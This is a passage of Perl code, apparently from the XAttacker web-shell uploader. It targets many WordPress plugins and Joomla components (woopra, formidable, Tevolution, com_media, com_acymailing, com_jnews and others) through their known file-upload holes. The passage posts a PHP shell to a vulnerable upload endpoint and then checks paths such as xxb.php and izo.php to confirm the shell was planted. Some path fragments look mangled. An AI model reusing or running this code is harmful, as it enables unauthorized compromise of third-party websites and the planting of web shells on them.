...
$zoomerup="$site/wp-content/plugins/woopra/inc/Result-upload-images/xxb.php";
...
$zoomerup="$site/wp-content/plugins/invit0r/lib/Result-upload-images/xxb.php";
...
$zoomerup="$site/wp-content/plugins/formidable/pro/js/Result-upload-images/xxb.php";
...
$zoomerup="$site/wp-content/plugins/wp-slimstat-ex/lib/ofc//Result-upload-images/xxb.php";
...
my $addblockurl = "$site/wp-content/plugins/Tevolution/Resultlconnector/monetize/templatic-custom_fields/single-upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["tool/XAttacker.php"],]);
if ($response->content =~ /"(.*?)"/) {
...
$zoomerup="$site/wp-content/plugins/seo-watcher/ofc/Result-upload-images/test.php";
...
################ Com Media #####################
sub comedias(){
my $tarmedia = "$site/index.php?option=com_media&view=images&Resultl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
...
$gravityformsup = "$site/administrator/components/com_redmystic/chart/Result-upload-images/izo.php";
my $checkk = $ua->get("$site/administrator/components/com_redmystic/chart/Result-upload-images/izo.php")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"Joomla";
print color('bold red'),"]==> ";
...
$zoomerup="$site/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/Result-upload-images/xxb.php";
...
$zoomerup="$site/administrator/components/com_acymailing/inc/openflash/Result-upload-images/xxb.php";
...
$zoomerup="$site/administrator/components/com_jnewsletter/includes/openflashchart/Result-upload-images/xxb.php";
...
$zoomerup="$site/administrator/components/com_jinc/classes/graphics/Result-upload-images/xxb.php";
...
$zoomerup="$site/administrator/components/com_maianmedia/utilities/charts/Result-upload-images/xxb.php";
...
$zoomerup="$site/administrator/components/com_jnews/includes/openflashchart/Result-upload-images/xxb.php";
...
$zoomerup="$site/components/com_joomleague/assets/classes//Result-upload-images/xxb.php";
